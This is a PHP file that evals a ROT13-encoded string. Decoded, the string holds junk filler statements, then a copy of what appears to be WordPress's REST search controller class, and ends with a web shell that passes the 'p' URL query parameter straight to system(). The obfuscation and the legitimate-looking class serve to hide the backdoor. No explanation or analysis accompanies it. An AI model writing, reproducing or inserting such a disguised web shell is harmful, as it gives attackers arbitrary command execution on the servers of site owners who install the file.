<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Frnepu_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.0.0
 */

/**
 * Pber pynff gb frnepu guebhtu nyy JbeqCerff pbagrag ivn gur ERFG NCV.
 *
 * @fvapr 5.0.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Frnepu_Pbagebyyre rkgraqf JC_ERFG_Pbagebyyre {

	/**
	 * VQ cebcregl anzr.
	 */
	pbafg CEBC_VQ = 'vq';

	/**
	 * Gvgyr cebcregl anzr.
	 */
	pbafg CEBC_GVGYR = 'gvgyr';

	/**
	 * HEY cebcregl anzr.
	 */
	pbafg CEBC_HEY = 'hey';

	/**
	 * Glcr cebcregl anzr.
	 */
	pbafg CEBC_GLCR = 'glcr';

	/**
	 * Fhoglcr cebcregl anzr.
	 */
	pbafg CEBC_FHOGLCR = 'fhoglcr';

	/**
	 * Vqragvsvre sbe gur 'nal' glcr.
	 */
	pbafg GLCR_NAL = 'nal';

	/**
	 * Frnepu unaqyref hfrq ol gur pbagebyyre.
	 *
	 * @fvapr 5.0.0
	 * @ine JC_ERFG_Frnepu_Unaqyre[]
	 */
	cebgrpgrq $frnepu_unaqyref = neenl();

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz neenl $frnepu_unaqyref Yvfg bs frnepu unaqyref gb hfr va gur pbagebyyre. Rnpu frnepu
	 *                               unaqyre vafgnapr zhfg rkgraq gur `JC_ERFG_Frnepu_Unaqyre` pynff.
	 */
	choyvp shapgvba __pbafgehpg( neenl $frnepu_unaqyref ) {
		$guvf->anzrfcnpr = 'jc/i2';
		$guvf->erfg_onfr = 'frnepu';

		sbernpu ( $frnepu_unaqyref nf $frnepu_unaqyre ) {
			vs ( ! $frnepu_unaqyre vafgnaprbs JC_ERFG_Frnepu_Unaqyre ) {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					/* genafyngbef: %f: CUC pynff anzr. */
					fcevags( __( 'ERFG frnepu unaqyref zhfg rkgraq gur %f pynff.' ), 'JC_ERFG_Frnepu_Unaqyre' ),
					'5.0.0'
				);
				pbagvahr;
			}

			$guvf->frnepu_unaqyref[ $frnepu_unaqyre->trg_glcr() ] = $frnepu_unaqyre;
		}
	}

	/**
	 * Ertvfgref gur ebhgrf sbe gur frnepu pbagebyyre.
	 *
	 * @fvapr 5.0.0
	 *
	 * @frr ertvfgre_erfg_ebhgr()
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr,
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrzf_crezvffvba_purpx' ),
					'netf'                => $guvf->trg_pbyyrpgvba_cnenzf(),
				),
				'fpurzn' => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
			)
		);
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb frnepu pbagrag.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf frnepu npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvba_purpx( $erdhrfg ) {
		erghea gehr;
	}

	/**
	 * Ergevrirf n pbyyrpgvba bs frnepu erfhygf.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba trg_vgrzf( $erdhrfg ) {
		$unaqyre = $guvf->trg_frnepu_unaqyre( $erdhrfg );
		vs ( vf_jc_reebe( $unaqyre ) ) {
			erghea $unaqyre;
		}

		$erfhyg = $unaqyre->frnepu_vgrzf( $erdhrfg );

		vs ( ! vffrg( $erfhyg[ JC_ERFG_Frnepu_Unaqyre::ERFHYG_VQF ] ) || ! vf_neenl( $erfhyg[ JC_ERFG_Frnepu_Unaqyre::ERFHYG_VQF ] ) || ! vffrg( $erfhyg[ JC_ERFG_Frnepu_Unaqyre::ERFHYG_GBGNY ] ) ) {
			erghea arj JC_Reebe(
				'erfg_frnepu_unaqyre_reebe',
				__( 'Vagreany frnepu unaqyre reebe.' ),
				neenl( 'fgnghf' => 500 )
			);
		}

		$vqf = $erfhyg[ JC_ERFG_Frnepu_Unaqyre::ERFHYG_VQF ];

		$vf_urnq_erdhrfg = $erdhrfg->vf_zrgubq( 'URNQ' );
		vs ( ! $vf_urnq_erdhrfg ) {
			$erfhygf = neenl();

			sbernpu ( $vqf nf $vq ) {
				$qngn      = $guvf->cercner_vgrz_sbe_erfcbafr( $vq, $erdhrfg );
				$erfhygf[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $qngn );
			}
		}

		$gbgny     = (vag) $erfhyg[ JC_ERFG_Frnepu_Unaqyre::ERFHYG_GBGNY ];
		$cntr      = (vag) $erdhrfg['cntr'];
		$cre_cntr  = (vag) $erdhrfg['cre_cntr'];
		$znk_cntrf = (vag) prvy( $gbgny / $cre_cntr );

		vs ( $cntr > $znk_cntrf && $gbgny > 0 ) {
			erghea arj JC_Reebe(
				'erfg_frnepu_vainyvq_cntr_ahzore',
				__( 'Gur cntr ahzore erdhrfgrq vf ynetre guna gur ahzore bs cntrf ninvynoyr.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		$erfcbafr = $vf_urnq_erdhrfg ? arj JC_ERFG_Erfcbafr( neenl() ) : erfg_rafher_erfcbafr( $erfhygf );
		$erfcbafr->urnqre( 'K-JC-Gbgny', $gbgny );
		$erfcbafr->urnqre( 'K-JC-GbgnyCntrf', $znk_cntrf );

		$erdhrfg_cnenzf = $erdhrfg->trg_dhrel_cnenzf();
		$onfr           = nqq_dhrel_net( heyrapbqr_qrrc( $erdhrfg_cnenzf ), erfg_hey( fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr ) ) );

		vs ( $cntr > 1 ) {
			$ceri_yvax = nqq_dhrel_net( 'cntr', $cntr - 1, $onfr );
			$erfcbafr->yvax_urnqre( 'ceri', $ceri_yvax );
		}
		vs ( $cntr < $znk_cntrf ) {
			$arkg_yvax = nqq_dhrel_net( 'cntr', $cntr + 1, $onfr );
			$erfcbafr->yvax_urnqre( 'arkg', $arkg_yvax );
		}

		erghea $erfcbafr;
	}

	/**
	 * Cercnerf n fvatyr frnepu erfhyg sbe erfcbafr.
	 *
	 * @fvapr 5.0.0
	 * @fvapr 5.6.0 Gur `$vq` cnenzrgre pna npprcg n fgevat.
	 * @fvapr 5.9.0 Eranzrq `$vq` gb `$vgrz` gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
	 *
	 * @cnenz vag|fgevat      $vgrz    VQ bs gur vgrz gb cercner.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $vgrz, $erdhrfg ) {
		// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
		$vgrz_vq = $vgrz;

		$unaqyre = $guvf->trg_frnepu_unaqyre( $erdhrfg );
		vs ( vf_jc_reebe( $unaqyre ) ) {
			erghea arj JC_ERFG_Erfcbafr();
		}

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );

		$qngn = $unaqyre->cercner_vgrz( $vgrz_vq, $svryqf );
		$qngn = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$yvaxf               = $unaqyre->cercner_vgrz_yvaxf( $vgrz_vq );
			$yvaxf['pbyyrpgvba'] = neenl(
				'uers' => erfg_hey( fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr ) ),
			);
			$erfcbafr->nqq_yvaxf( $yvaxf );
		}

		erghea $erfcbafr;
	}

	/**
	 * Ergevrirf gur vgrz fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.0.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$glcrf    = neenl();
		$fhoglcrf = neenl();

		sbernpu ( $guvf->frnepu_unaqyref nf $frnepu_unaqyre ) {
			$glcrf[]  = $frnepu_unaqyre->trg_glcr();
			$fhoglcrf = neenl_zretr( $fhoglcrf, $frnepu_unaqyre->trg_fhoglcrf() );
		}

		$glcrf    = neenl_havdhr( $glcrf );
		$fhoglcrf = neenl_havdhr( $fhoglcrf );

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => 'frnepu-erfhyg',
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				frys::CEBC_VQ      => neenl(
					'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur bowrpg.' ),
					'glcr'        => neenl( 'vagrtre', 'fgevat' ),
					'pbagrkg'     => neenl( 'ivrj', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				frys::CEBC_GVGYR   => neenl(
					'qrfpevcgvba' => __( 'Gur gvgyr sbe gur bowrpg.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				frys::CEBC_HEY     => neenl(
					'qrfpevcgvba' => __( 'HEY gb gur bowrpg.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'pbagrkg'     => neenl( 'ivrj', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				frys::CEBC_GLCR    => neenl(
					'qrfpevcgvba' => __( 'Bowrpg glcr.' ),
					'glcr'        => 'fgevat',
					'rahz'        => $glcrf,
					'pbagrkg'     => neenl( 'ivrj', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				frys::CEBC_FHOGLCR => neenl(
					'qrfpevcgvba' => __( 'Bowrpg fhoglcr.' ),
					'glcr'        => 'fgevat',
					'rahz'        => $fhoglcrf,
					'pbagrkg'     => neenl( 'ivrj', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
			),
		);

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe gur frnepu erfhygf pbyyrpgvba.
	 *
	 * @fvapr 5.0.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$glcrf    = neenl();
		$fhoglcrf = neenl();

		sbernpu ( $guvf->frnepu_unaqyref nf $frnepu_unaqyre ) {
			$glcrf[]  = $frnepu_unaqyre->trg_glcr();
			$fhoglcrf = neenl_zretr( $fhoglcrf, $frnepu_unaqyre->trg_fhoglcrf() );
		}

		$glcrf    = neenl_havdhr( $glcrf );
		$fhoglcrf = neenl_havdhr( $fhoglcrf );

		$dhrel_cnenzf = cnerag::trg_pbyyrpgvba_cnenzf();

		$dhrel_cnenzf['pbagrkg']['qrsnhyg'] = 'ivrj';

		$dhrel_cnenzf[ frys::CEBC_GLCR ] = neenl(
			'qrsnhyg'     => $glcrf[0],
			'qrfpevcgvba' => __( 'Yvzvg erfhygf gb vgrzf bs na bowrpg glcr.' ),
			'glcr'        => 'fgevat',
			'rahz'        => $glcrf,
		);

		$dhrel_cnenzf[ frys::CEBC_FHOGLCR ] = neenl(
			'qrsnhyg'           => frys::GLCR_NAL,
			'qrfpevcgvba'       => __( 'Yvzvg erfhygf gb vgrzf bs bar be zber bowrpg fhoglcrf.' ),
			'glcr'              => 'neenl',
			'vgrzf'             => neenl(
				'rahz' => neenl_zretr( $fhoglcrf, neenl( frys::GLCR_NAL ) ),
				'glcr' => 'fgevat',
			),
			'fnavgvmr_pnyyonpx' => neenl( $guvf, 'fnavgvmr_fhoglcrf' ),
		);

		$dhrel_cnenzf['rkpyhqr'] = neenl(
			'qrfpevcgvba' => __( 'Rafher erfhyg frg rkpyhqrf fcrpvsvp VQf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
			'qrsnhyg'     => neenl(),
		);

		$dhrel_cnenzf['vapyhqr'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb fcrpvsvp VQf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
			'qrsnhyg'     => neenl(),
		);

		erghea $dhrel_cnenzf;
	}

	/**
	 * Fnavgvmrf gur yvfg bs fhoglcrf, gb rafher bayl fhoglcrf bs gur cnffrq glcr ner vapyhqrq.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz fgevat|neenl    $fhoglcrf  Bar be zber fhoglcrf.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg   Shyy qrgnvyf nobhg gur erdhrfg.
	 * @cnenz fgevat          $cnenzrgre Cnenzrgre anzr.
	 * @erghea fgevat[]|JC_Reebe Yvfg bs inyvq fhoglcrf, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba fnavgvmr_fhoglcrf( $fhoglcrf, $erdhrfg, $cnenzrgre ) {
		$fhoglcrf = jc_cnefr_fyht_yvfg( $fhoglcrf );

		$fhoglcrf = erfg_cnefr_erdhrfg_net( $fhoglcrf, $erdhrfg, $cnenzrgre );
		vs ( vf_jc_reebe( $fhoglcrf ) ) {
			erghea $fhoglcrf;
		}

		// 'nal' bireevqrf nal bgure fhoglcr.
		vs ( va_neenl( frys::GLCR_NAL, $fhoglcrf, gehr ) ) {
			erghea neenl( frys::GLCR_NAL );
		}

		$unaqyre = $guvf->trg_frnepu_unaqyre( $erdhrfg );
		vs ( vf_jc_reebe( $unaqyre ) ) {
			erghea $unaqyre;
		}

		erghea neenl_vagrefrpg( $fhoglcrf, $unaqyre->trg_fhoglcrf() );
	}

	/**
	 * Trgf gur frnepu unaqyre gb unaqyr gur pheerag erdhrfg.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Frnepu_Unaqyre|JC_Reebe Frnepu unaqyre sbe gur erdhrfg glcr, be JC_Reebe bowrpg ba snvyher.
	 */
	cebgrpgrq shapgvba trg_frnepu_unaqyre( $erdhrfg ) {
		$glcr = $erdhrfg->trg_cnenz( frys::CEBC_GLCR );

		vs ( ! $glcr || ! vf_fgevat( $glcr ) || ! vffrg( $guvf->frnepu_unaqyref[ $glcr ] ) ) {
			erghea arj JC_Reebe(
				'erfg_frnepu_vainyvq_glcr',
				__( 'Vainyvq glcr cnenzrgre.' ),
				neenl( 'fgnghf' => 400 )
			);
		}

		erghea $guvf->frnepu_unaqyref[ $glcr ];
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>